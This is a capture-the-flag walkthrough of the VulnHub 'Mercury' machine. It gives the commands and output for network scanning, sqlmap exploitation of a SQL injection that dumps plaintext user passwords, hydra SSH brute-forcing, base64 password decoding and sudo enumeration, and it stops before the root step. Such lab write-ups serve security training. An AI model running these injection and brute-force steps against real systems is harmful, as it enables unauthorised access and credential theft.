# Mercury

### 1.Get VM IP

```bash
root@kali:arp-scan -I eth0 -l                           
Interface: eth0, type: EN10MB, MAC: 08:00:27:c4:58:52, IPv4: 192.168.56.140
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:40	(Unknown: locally administered)
192.168.56.100	08:00:27:74:2d:92	PCS Systemtechnik GmbH
192.168.56.139	08:00:27:63:63:96	PCS Systemtechnik GmbH
```

The IP address is `192.168.56.139`, let's enumerate it.


### 2.Enumeration

```bash
root@kali: nmap -v -sC -sV 192.168.56.139
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

let's check the web page :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/e2898a20-816f-48cd-bd7c-10524855fb58)

there is nothing interesting, but if you navigate to a random page like `/test`, you will see an error page :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f0a68882-ead8-4bd5-8324-0f2ac7757258)

on this page, you can see an extra directory `mercuryfacts/` that we are allowed to visit, so let's go there :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/9851de80-4203-40cf-b53a-e36d15db1380)

click on `Load a fact` and you will see the following page :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/491a854f-ad01-414c-8b29-0c0dffaf7e8f)

if you play with the last digit and make it to `2` or `3` or ... you will see new messages :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b95d504a-3591-4645-9716-c919779e3fbc)

this ca be a sign that these pages are getting called from the database by the number of the fact so adding a single quote :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/6f5115c8-e4a6-4259-992c-4ab5ce76391b)


yes there is a SQL injection here, the rest is easy as we put the URL into sqlmap :

```bash
root@kali: sqlmap -u http://192.168.56.139:8080/mercuryfacts/1 --batch --dbs

[07:28:50] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury


root@kali: sqlmap -u http://192.168.56.139:8080/mercuryfacts/1 --batch -D mercury --tables
[07:29:31] [INFO] fetching tables for database: 'mercury'
Database: mercury
[2 tables]
+-------+
| facts |
| users |
+-------+


root@kali: sqlmap -u http://192.168.56.139:8080/mercuryfacts/1 --batch -D mercury -T users --dump
[07:30:03] [INFO] fetching entries for table 'users' in database 'mercury'
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
```

### 3.Gaining Shell

Now that we have usernames and passwords we need to brute-force the SSH service, so save all the usernames into a file called `username.txt`

and all the passwords into a file called `password.txt` and use `hydra` to check the credentials :

```bash
root@kali: hydra -L users.txt -P passwords.txt -e nsr 192.168.56.139 ssh -t 10
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b1f06b18-dc40-4101-b08b-8dcfbab6872b)

now we can connect to victim using `webmaster:mercuryisthesizeof0.056Earths`

### 4.Privilege Escalation (To linuxmaster)

In home directory of user `webmaster` there is another directory called `mercury_proj` and a file `note.txt` :

```bash
webmaster@mercury:~$ cat mercury_proj/notes.txt 
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

here is the password for user `linuxmaster` :

```bash
webmaster@mercury:~$ echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d
mercurymeandiameteris4880km
```

### 5.Privilege Escalation (To root)

We connect to user `linuxmaster:mercurymeandiameteris4880km` :

```bash
webmaster@mercury:~$ su linuxmaster
Password: 
linuxmaster@mercury:/home/webmaster$
```

check sudo permissions :

```bash
linuxmaster@mercury:/home/webmaster$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```















